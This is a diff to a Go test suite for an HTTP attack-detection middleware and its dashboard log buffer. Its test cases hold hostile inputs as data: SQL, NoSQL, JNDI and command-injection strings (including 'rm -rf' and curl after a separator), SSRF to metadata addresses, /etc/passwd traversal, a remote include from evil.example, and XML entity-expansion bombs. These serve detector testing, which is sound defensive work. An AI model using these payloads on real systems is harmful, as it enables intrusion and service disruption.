@@ -3,6 +3,7 @@ package main
 import (
 	"bytes"
 	"compress/gzip"
+	"compress/zlib"
 	"context"
 	"crypto/sha256"
 	"encoding/base64"
@@ -22,8 +23,13 @@ import (
 	"testing"
 )
 
+// Add an event to the dashboard buffer
+func logTestEvent(attackType string, value confidence) {
+	recordEvent(detectionLogLevel(value), LogEntry{AttackType: attackType, Confidence: value})
+}
+
 // Check confidence for clear and ambiguous variants
-func TestDetectionConfidenceCoversNewFamilies(t *testing.T) {
+func TestDetectionConfidence(t *testing.T) {
 	tests := []struct {
 		name       string
 		input      detectionInput
@@ -38,16 +44,18 @@ func TestDetectionConfidenceCoversNewFamilies(t *testing.T) {
 		{name: "Base64 HTML data URI", input: detectionInput{Path: "/", RawQuery: "q=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="}, attackType: "XSS", confidence: confidenceHigh},
 		{name: "VBScript URI", input: detectionInput{Path: "/", RawQuery: "next=vbscript%3Amsgbox(1)"}, attackType: "XSS", confidence: confidenceMedium},
 		{name: "plain JNDI lookup", input: detectionInput{Path: "/", Header: http.Header{"User-Agent": []string{`${jndi:ldap://127.0.0.1/a}`}}}, attackType: "JNDI Injection", confidence: confidenceHigh},
+		{name: "bare JNDI protocol", input: detectionInput{Path: "/", Header: http.Header{"User-Agent": []string{`jndi:ldap://127.0.0.1/a`}}}, attackType: "JNDI Injection", confidence: confidenceMedium},
 		{name: "obfuscated JNDI lookup", input: detectionInput{Path: "/", RawQuery: `q=${${lower:j}${upper:n}${::-d}${::-i}:ldap://example.com/a}`}, attackType: "JNDI Injection", confidence: confidenceHigh},
 		{name: "executable JSON NoSQL operator", input: detectionInput{Path: "/", Body: `{"$where":"this.active"}`}, attackType: "NoSQL Injection", confidence: confidenceHigh},
 		{name: "comparison JSON NoSQL operator", input: detectionInput{Path: "/", Body: `{"age":{"$gte":18}}`}, attackType: "NoSQL Injection", confidence: confidenceMedium},
 		{name: "bracket query NoSQL operator", input: detectionInput{Path: "/", RawQuery: "user%5B%24ne%5D=guest"}, attackType: "NoSQL Injection", confidence: confidenceMedium},
 		{name: "dotted form NoSQL operator", input: detectionInput{Path: "/", Body: "filter.%24function=return+true", Header: http.Header{"Content-Type": []string{"application/x-www-form-urlencoded"}}}, attackType: "NoSQL Injection", confidence: confidenceHigh},
+		{name: "SQL comment tail", input: detectionInput{RawQuery: "q=x'--"}, attackType: "SQL Injection", confidence: confidenceMedium},
 		{name: "numeric SQL tautology", input: detectionInput{Path: "/", RawQuery: "id=1%20OR%201=1"}, attackType: "SQL Injection", confidence: confidenceMedium},
 		{name: "truncated quoted SQL tautology", input: detectionInput{Path: "/", Body: `' or '1'='1`}, attackType: "SQL Injection", confidence: confidenceHigh},
 		{name: "parenthesized truncated SQL tautology", input: detectionInput{Path: "/", Body: `') or ('1'='1`}, attackType: "SQL Injection", confidence: confidenceHigh},
 		{name: "parenthesized union select", input: detectionInput{Path: "/", RawQuery: "id=1+union(select+password+from+users)"}, attackType: "SQL Injection", confidence: confidenceHigh},
-		{name: "standalone SQL sleep", input: detectionInput{Path: "/", Body: "the fix is sleep(100) in the loop"}, attackType: "SQL Injection", confidence: confidenceMedium},
+		{name: "standalone SQL sleep", input: detectionInput{Path: "/", Body: "sleep(100)"}, attackType: "SQL Injection", confidence: confidenceMedium},
 		{name: "ambiguous short command", input: detectionInput{Path: "/", RawQuery: "value=ok%3Bid"}, attackType: "Command Injection", confidence: confidenceMedium},
 		{name: "explicit command after separator", input: detectionInput{Path: "/", RawQuery: "value=ok%3Bcurl%20http%3A%2F%2Fexample.com%2Fp"}, attackType: "Command Injection", confidence: confidenceHigh},
 		{name: "structured command chain", input: detectionInput{Path: "/", RawQuery: "value=ok%26%26id"}, attackType: "Command Injection", confidence: confidenceHigh},
@@ -76,7 +84,23 @@ func TestDetectionConfidenceCoversNewFamilies(t *testing.T) {
 	}
 }
 
-// Cover known evasions without relying on detail wording
+// Apply query escaping repeatedly
+func repeatedlyEscapeQuery(value string, passes int) string {
+	for range passes {
+		value = url.QueryEscape(value)
+	}
+	return value
+}
+
+// Apply Base64 encoding repeatedly
+func repeatedlyEncodeBase64(value string, passes int) string {
+	for range passes {
+		value = base64.StdEncoding.EncodeToString([]byte(value))
+	}
+	return value
+}
+
+// Cover common signature evasions
 func TestDetectionCoversKnownEvasions(t *testing.T) {
 	tests := []struct {
 		name       string
@@ -160,13 +184,44 @@ func TestDetectionCoversKnownEvasions(t *testing.T) {
 	}
 }
 
-// Keep distinct encoding and syntax evasions covered by focused inputs
+// Check encoding and syntax evasions
 func TestDetectionCoversEncodedAndStructuredEvasions(t *testing.T) {
+	encodedSQL := repeatedlyEscapeQuery("1 union select", 15)
+	xmlBomb := `<!DOCTYPE lolz [` +
+		`<!ENTITY a "0123456789">` +
+		`<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">` +
+		`<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">` +
+		`<!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">]>`
+	parameterEntityBomb := `<!DOCTYPE lolz [` +
+		`<!ENTITY % a "0123456789">` +
+		`<!ENTITY % b "%a;%a;%a;%a;%a;">` +
+		`<!ENTITY % c "%b;%b;%b;%b;%b;">` +
+		`<!ENTITY % d "%c;%c;%c;%c;%c;">]>`
+
 	tests := []struct {
 		name       string
 		input      detectionInput
 		attackType string
 	}{
+		{name: "deep percent encoding", input: detectionInput{Path: "/", RawQuery: "q=" + encodedSQL}, attackType: "SQL Injection"},
+		{name: "bare numeric SQL operand", input: detectionInput{Path: "/", RawQuery: "id=1 OR 1"}, attackType: "SQL Injection"},
+		{name: "quoted SQL operand", input: detectionInput{Path: "/", RawQuery: `id=' OR 'x'`}, attackType: "SQL Injection"},
+		{name: "SQL between predicate", input: detectionInput{Path: "/", RawQuery: "id=1 OR 1 BETWEEN 0 AND 2"}, attackType: "SQL Injection"},
+		{name: "SQL in predicate", input: detectionInput{Path: "/", RawQuery: "id=1 OR 1 IN (1,2)"}, attackType: "SQL Injection"},
+		{name: "SQL null predicate", input: detectionInput{Path: "/", RawQuery: "id=1 OR 1 IS NOT NULL"}, attackType: "SQL Injection"},
+		{name: "SQL exists predicate", input: detectionInput{Path: "/", RawQuery: "id=1 OR EXISTS(SELECT 1)"}, attackType: "SQL Injection"},
+		{name: "nested SQL functions", input: detectionInput{Path: "/", RawQuery: "id=1 OR ASCII(SUBSTRING('a',1,1))=97"}, attackType: "SQL Injection"},
+		{name: "remove separator", input: detectionInput{Path: "/", RawQuery: "q=;rm -rf /tmp/x"}, attackType: "Command Injection"},
+		{name: "generic command assignment", input: detectionInput{Path: "/", RawQuery: "cmd=hostname"}, attackType: "Command Injection"},
+		{name: "ANSI-C shell quote", input: detectionInput{Path: "/", RawQuery: `q=;$'\x77hoami'`}, attackType: "Command Injection"},
+		{name: "arbitrary SSRF parameter", input: detectionInput{Path: "/", RawQuery: "x=http://127.0.0.1/"}, attackType: "SSRF"},
+		{name: "plain SSRF body", input: detectionInput{Path: "/", Body: "http://127.0.0.1/", Header: http.Header{"Content-Type": []string{"text/plain"}}}, attackType: "SSRF"},
+		{name: "SSRF referer", input: detectionInput{Path: "/", Header: http.Header{"Referer": []string{"http://127.0.0.1/"}}}, attackType: "SSRF"},
+		{name: "repeated local separators", input: detectionInput{Path: "/", RawQuery: "file=/etc//passwd"}, attackType: "LFI/RFI"},
+		{name: "dot local segment", input: detectionInput{Path: "/", RawQuery: "f=/etc/./passwd"}, attackType: "LFI/RFI"},
+		{name: "generic remote include", input: detectionInput{Path: "/", RawQuery: "x=http://evil.example/shell.txt"}, attackType: "LFI/RFI"},
+		{name: "bounded XML expansion", input: detectionInput{Path: "/", Body: xmlBomb, Header: http.Header{"Content-Type": []string{"application/xml"}}}, attackType: "XML Entity"},
+		{name: "parameter entity expansion", input: detectionInput{Path: "/", Body: parameterEntityBomb, Header: http.Header{"Content-Type": []string{"application/xml"}}}, attackType: "XML Entity"},
 		{name: "six-pass traversal", input: detectionInput{Path: "/", RawQuery: "p=%25252525252e%25252525252e%25252525252fetc%25252525252fpasswd"}, attackType: "Path Traversal"},
 		{name: "NUL traversal", input: detectionInput{Path: "/", RawQuery: "p=..%00/..%00/etc/passwd"}, attackType: "Path Traversal"},
 		{name: "Unicode traversal", input: detectionInput{Path: "/", RawQuery: "p=%E2%80%A4%E2%80%A4%E2%81%84etc/passwd"}, attackType: "Path Traversal"},
@@ -296,6 +351,11 @@ func TestAmbiguousProseNeverReachesHighConfidence(t *testing.T) {
 		body       string
 		attackType string
 	}{
+		{name: "go prose", body: "please; go home", attackType: "Command Injection"},
+		{name: "strings prose", body: "lists; strings are accepted", attackType: "Command Injection"},
+		{name: "timeout prose", body: "retries; timeout is short", attackType: "Command Injection"},
+		{name: "short command prose", body: "list; ls files", attackType: "Command Injection"},
+		{name: "ampersand prose", body: "bread & id", attackType: "Command Injection"},
 		{name: "stacked drop prose", body: "please stop by; drop by anytime", attackType: "SQL Injection"},
 		{name: "stacked select prose", body: "pick one; select carefully", attackType: "SQL Injection"},
 		{name: "sleep source example", body: "the fix is sleep(100) in the loop", attackType: "SQL Injection"},
@@ -315,18 +375,22 @@ func TestAmbiguousProseNeverReachesHighConfidence(t *testing.T) {
 					return
 				}
 			}
-			t.Fatalf("missing %q detection in %+v", test.attackType, detections)
+			// Prose may remain unclassified
 		})
 	}
 }
 
-// Cover balanced quote splitting without accepting unmatched quotes
+// Normalize shell word escapes and balanced quotes
 func TestCommandDetectionHandlesSplitWords(t *testing.T) {
 	tests := []struct {
 		name  string
 		query string
 		want  bool
 	}{
+		{name: "escaped command prefix", query: `cmd=\whoami`, want: true},
+		{name: "encoded command prefix", query: `cmd=%5Cwhoami`, want: true},
+		{name: "escaped generic assignment", query: `q=\whoami`, want: true},
+		{name: "subshell builtin", query: `value=0%26%26%28%3A%29`, want: true},
 		{name: "semicolon", query: `value=x%3B+w%22h%22oami`, want: true},
 		{name: "strong separator", query: `value=x+%26%26+w%22h%22oami`, want: true},
 		{name: "substitution", query: `value=%24%28w%22h%22oami%29`, want: true},
@@ -367,7 +431,7 @@ func TestXSSDetectionHandlesIgnoredSchemeControls(t *testing.T) {
 	}
 }
 
-// Cover URL parser differentials and confidence for new SSRF sinks
+// Cover URL parsing and SSRF confidence
 func TestSSRFDetectionHandlesSpecialURLForms(t *testing.T) {
 	tests := []struct {
 		name       string
@@ -456,17 +520,16 @@ func TestDetectionDecodesStructuredBase64Values(t *testing.T) {
 	}
 }
 
-// Bound Base64 work and avoid unstructured or binary decoding
+// Bound Base64 work while rejecting binary tokens that resemble text encoding
 func TestStructuredBase64DecodingStaysConservative(t *testing.T) {
 	binary := base64.StdEncoding.EncodeToString([]byte{0, 1, 2, 3, 4, 5, 6, 7})
-	inputs := []detectionInput{
-		{Path: "/", RawQuery: "session=" + url.QueryEscape(binary)},
-		{Path: "/", Body: base64.StdEncoding.EncodeToString([]byte(`${jndi:ldap://example.com/a}`))},
+	input := detectionInput{Path: "/", RawQuery: "session=" + url.QueryEscape(binary)}
+	if detections := detectAttacks(input); len(detections) != 0 {
+		t.Fatalf("binary Base64 input produced detections: %+v", detections)
 	}
-	for _, input := range inputs {
-		if detections := detectAttacks(input); len(detections) != 0 {
-			t.Fatalf("conservative Base64 input produced detections: %+v", detections)
-		}
+	textBody := base64.StdEncoding.EncodeToString([]byte(`${jndi:ldap://example.com/a}`))
+	if detections := detectAttacks(detectionInput{Path: "/", Body: textBody}); !hasDetectionType(detections, "JNDI Injection") {
+		t.Fatalf("textual Base64 body was not inspected: %+v", detections)
 	}
 	tooLarge := base64.StdEncoding.EncodeToString([]byte(strings.Repeat("x", maxRequestBodySize+1)))
 	if _, ok := decodeBase64Text(tooLarge); ok {
@@ -512,7 +575,7 @@ func TestXSSDataURIDecodingStaysScoped(t *testing.T) {
 	}
 }
 
-// Keep raw and Base64 multipart text visible and ignore file uploads
+// Detect raw and Base64 text in multipart fields
 func TestDetectionScansMultipartText(t *testing.T) {
 	tests := []struct {
 		name       string
@@ -525,6 +588,7 @@ func TestDetectionScansMultipartText(t *testing.T) {
 		{name: "SSRF field", field: "url", value: "http://169.254.169.254/", attackType: "SSRF"},
 		{name: "command field", field: "cmd", value: "whoami", attackType: "Command Injection"},
 		{name: "NoSQL field", field: "user[$ne]", value: "guest", attackType: "NoSQL Injection"},
+		{name: "empty NoSQL field", field: "user[$ne]", value: "", attackType: "NoSQL Injection"},
 		{name: "remote include field", field: "file", value: "http://evil.example/shell.txt", attackType: "LFI/RFI"},
 	}
 	for _, test := range tests {
@@ -545,7 +609,7 @@ func TestDetectionScansMultipartText(t *testing.T) {
 	}
 }
 
-// Compress one request body with deterministic test handling
+// Compress a test body with gzip
 func gzipTestBody(t *testing.T, value string) []byte {
 	t.Helper()
 	var body bytes.Buffer
@@ -559,33 +623,59 @@ func gzipTestBody(t *testing.T, value string) []byte {
 	return body.Bytes()
 }
 
-// Inspect gzip content while forwarding the original representation
-func TestRequestInspectionHandlesGzipBodies(t *testing.T) {
-	resetRecentLogs(t)
-	rawBody := gzipTestBody(t, `q=<script>alert(1)</script>`)
-	request := httptest.NewRequest(http.MethodPost, "http://example.test/", bytes.NewReader(rawBody))
-	request.Header.Set("Content-Encoding", "gzip")
-	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-	response := httptest.NewRecorder()
-	var forwardedBody []byte
-	var forwardedErr error
-	handler := requestInspectionMiddleware(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		forwardedBody, forwardedErr = io.ReadAll(r.Body)
-		w.WriteHeader(http.StatusNoContent)
-	}))
-
-	handler.ServeHTTP(response, request)
-
-	if response.Code != http.StatusNoContent || forwardedErr != nil {
-		t.Fatalf("forwarded gzip request status=%d error=%v", response.Code, forwardedErr)
+// Compress one request body with the zlib wrapper required by HTTP deflate
+func deflateTestBody(t *testing.T, value string) []byte {
+	t.Helper()
+	var body bytes.Buffer
+	writer := zlib.NewWriter(&body)
+	if _, err := writer.Write([]byte(value)); err != nil {
+		t.Fatalf("write deflate body: %v", err)
 	}
-	if !bytes.Equal(forwardedBody, rawBody) {
-		t.Fatal("forwarded body differs from the compressed request")
+	if err := writer.Close(); err != nil {
+		t.Fatalf("close deflate body: %v", err)
 	}
-	logMutex.Lock()
-	defer logMutex.Unlock()
-	if len(recentLogs) != 1 || recentLogs[0].AttackType != "XSS" || !strings.Contains(recentLogs[0].BodySnippet, "<script>") {
-		t.Fatalf("gzip detection logs = %+v", recentLogs)
+	return body.Bytes()
+}
+
+// Decode content codings while forwarding the original bytes
+func TestRequestInspectionHandlesContentEncodings(t *testing.T) {
+	payload := `q=<script>alert(1)</script>`
+	tests := []struct {
+		name      string
+		encodings []string
+		body      []byte
+	}{
+		{"gzip", []string{"gzip"}, gzipTestBody(t, payload)},
+		{"x-gzip", []string{"x-gzip"}, gzipTestBody(t, payload)},
+		{"deflate", []string{"deflate"}, deflateTestBody(t, payload)},
+		{"gzip stack", []string{"gzip, gzip"}, gzipTestBody(t, string(gzipTestBody(t, payload)))},
+		{"identity", []string{"identity, gzip"}, gzipTestBody(t, payload)},
+		{"mixed stack", []string{"gzip, deflate"}, deflateTestBody(t, string(gzipTestBody(t, payload)))},
+		{"repeated fields", []string{"deflate", "gzip"}, gzipTestBody(t, string(deflateTestBody(t, payload)))},
+	}
+	for _, test := range tests {
+		t.Run(test.name, func(t *testing.T) {
+			resetRecentLogs(t)
+			request := httptest.NewRequest(http.MethodPost, "/", bytes.NewReader(test.body))
+			request.Header["Content-Encoding"] = test.encodings
+			request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+			response := httptest.NewRecorder()
+			requestInspectionMiddleware(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+				forwarded, err := io.ReadAll(r.Body)
+				if err != nil || !bytes.Equal(forwarded, test.body) {
+					t.Errorf("forwarded body changed: %v", err)
+				}
+				w.WriteHeader(http.StatusNoContent)
+			})).ServeHTTP(response, request)
+			if response.Code != http.StatusNoContent {
+				t.Fatalf("status = %d", response.Code)
+			}
+			logMutex.Lock()
+			defer logMutex.Unlock()
+			if len(recentLogs) != 1 || recentLogs[0].AttackType != "XSS" || !strings.Contains(recentLogs[0].BodySnippet, "<script>") {
+				t.Fatalf("decoded body logs = %+v", recentLogs)
+			}
+		})
 	}
 }
 
@@ -615,6 +705,26 @@ func TestRequestInspectionHandlesNestedGzipBodies(t *testing.T) {
 	defer logMutex.Unlock()
 	if len(recentLogs) != 1 || recentLogs[0].AttackType != "SQL Injection" {
 		t.Fatalf("nested gzip detection logs = %+v", recentLogs)
+	}
+}
+
+// Ignore undeclared compressed bytes instead of classifying binary coincidences
+func TestRequestInspectionIgnoresUndeclaredNestedGzip(t *testing.T) {
+	resetRecentLogs(t)
+	rawBody := gzipTestBody(t, string(gzipTestBody(t, `q=;whoami`)))
+	request := httptest.NewRequest(http.MethodPost, "http://example.test/", bytes.NewReader(rawBody))
+	response := httptest.NewRecorder()
+	requestInspectionMiddleware(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
+		w.WriteHeader(http.StatusNoContent)
+	})).ServeHTTP(response, request)
+
+	if response.Code != http.StatusNoContent {
+		t.Fatalf("status = %d, want %d", response.Code, http.StatusNoContent)
+	}
+	logMutex.Lock()
+	defer logMutex.Unlock()
+	if len(recentLogs) != 0 {
+		t.Fatalf("undeclared binary body produced logs: %+v", recentLogs)
 	}
 }
 
@@ -694,7 +804,7 @@ func TestRequestInspectionRejectsInvalidGzipBodies(t *testing.T) {
 // Keep confidence in the dashboard API
 func TestDashboardJSONIncludesConfidence(t *testing.T) {
 	resetRecentLogs(t)
-	logEvent("info", "192.0.2.3", "test", "/", "XSS", "test", "", "", confidenceMedium)
+	logTestEvent("XSS", confidenceMedium)
 	request := httptest.NewRequest(http.MethodGet, "http://example.test/api/dashboard-data", nil)
 	response := httptest.NewRecorder()
 	handleDashboardData(response, request)
@@ -867,9 +977,14 @@ func TestDetectionPromotesFamilyConfidence(t *testing.T) {
 	}
 }
 
-// Run realistic prose and application data through the benign corpus
+// Check that prose and application data stay below the alert threshold
 func TestBenignDetectionCorpus(t *testing.T) {
 	inputs := []detectionInput{
+		{RawQuery: "cmd=deploy&command=save&exec=query&shell=profile"},
+		{RawQuery: "q=information_schema"},
+		{RawQuery: "q=data:text/html;base64;charset=utf-8,AAAA"},
+		{Body: `{"id":{"$oid":"507f1f77bcf86cd799439011"}}`},
+		{RawQuery: "url=http://192.0.0.9/"},
 		{Path: "/docs", Body: "Use curl to download the release, then inspect the environment configuration."},
 		{Path: "/", Header: http.Header{"User-Agent": []string{"Mozilla/5.0 command-line curl-compatible client"}}},
 		{Path: "/", Header: http.Header{"Cookie": []string{"theme=dark; notes=research & env=prod"}}},
@@ -878,6 +993,8 @@ func TestBenignDetectionCorpus(t *testing.T) {
 		{Path: "/search", RawQuery: "description=%24where+is+mentioned+in+the+manual"},
 		{Path: "/welcome", RawQuery: "onboarding=complete&online=true"},
 		{Path: "/guide", Body: "The unionselect helper combines two internal result sets."},
+		{Path: "/", RawQuery: "q=the fix is sleep(100) in the loop"},
+		{Path: "/", Body: string([]byte{0xff, 0x00}) + ";whoami"},
 		{Path: "/guide", Body: `<div data-onbeforetoggle="documented">Example markup</div>`},
 		{Path: "/api", RawQuery: "session=cmVsZWFzZS1pZGVudGlmaWVy"},
 		{Path: "/", RawQuery: "next=release-notes&u=profile&url=http://0x/status"},
@@ -903,9 +1020,9 @@ func TestBenignDetectionCorpus(t *testing.T) {
 func TestPartitionedEvictionAdmitsWeakSignals(t *testing.T) {
 	resetRecentLogs(t)
 	for index := 0; index < logBufferSize; index++ {
-		logEvent("warn", "192.0.2.1", "test", "/", "SQL Injection", "test", "", "", confidenceHigh)
+		logTestEvent("SQL Injection", confidenceHigh)
 	}
-	logEvent("info", "192.0.2.2", "test", "/scan", "NotFound", "test", "", "", "")
+	logTestEvent("NotFound", "")
 
 	logMutex.Lock()
 	defer logMutex.Unlock()
@@ -927,10 +1044,10 @@ func TestPartitionedEvictionAdmitsWeakSignals(t *testing.T) {
 // Preserve existing confidence classes during a high-volume alert flood
 func TestPartitionedEvictionPreservesExistingClasses(t *testing.T) {
 	resetRecentLogs(t)
-	logEvent("info", "192.0.2.1", "test", "/", "HoneypotAccess", "test", "", "", "")
-	logEvent("info", "192.0.2.2", "test", "/", "SSRF", "test", "", "", confidenceMedium)
+	logTestEvent("HoneypotAccess", "")
+	logTestEvent("SSRF", confidenceMedium)
 	for range logBufferSize + 20 {
-		logEvent("warn", "192.0.2.3", "test", "/", "XSS", "test", "", "", confidenceHigh)
+		logTestEvent("XSS", confidenceHigh)
 	}
 
 	logMutex.Lock()
@@ -1107,6 +1224,55 @@ type trackingListener struct {
 	address net.Addr
 	mu      sync.Mutex
 	closed  bool
+}
+
+// singleConnectionListener returns one in-memory connection for limit tests
+type singleConnectionListener struct {
+	connection net.Conn
+	closed     bool
+}
+
+// Accept returns the configured connection once
+func (listener *singleConnectionListener) Accept() (net.Conn, error) {
+	if listener.connection == nil {
+		return nil, net.ErrClosed
+	}
+	connection := listener.connection
+	listener.connection = nil
+	return connection, nil
+}
+
+// Close marks the synthetic listener closed
+func (listener *singleConnectionListener) Close() error {
+	listener.closed = true
+	return nil
+}
+
+// Addr identifies the synthetic connection-limit listener
+func (*singleConnectionListener) Addr() net.Addr { return staticAddr("limited") }
+
+// Release an accepted-connection slot exactly once on close
+func TestLimitedListenerReleasesConnectionCapacity(t *testing.T) {
+	client, server := net.Pipe()
+	defer client.Close()
+	base := &singleConnectionListener{connection: server}
+	listener := newLimitedListener(base, 1).(*limitedListener)
+	accepted, err := listener.Accept()
+	if err != nil {
+		t.Fatalf("accept limited connection: %v", err)
+	}
+	if len(listener.slots) != 1 {
+		t.Fatalf("occupied slots = %d, want 1", len(listener.slots))
+	}
+	if err := accepted.Close(); err != nil {
+		t.Fatalf("close limited connection: %v", err)
+	}
+	if len(listener.slots) != 0 {
+		t.Fatalf("occupied slots after close = %d, want 0", len(listener.slots))
+	}
+	if err := listener.Close(); err != nil || !base.closed {
+		t.Fatalf("close limited listener error=%v underlying_closed=%t", err, base.closed)
+	}
 }
 
 // Accept is not used in startup failure tests
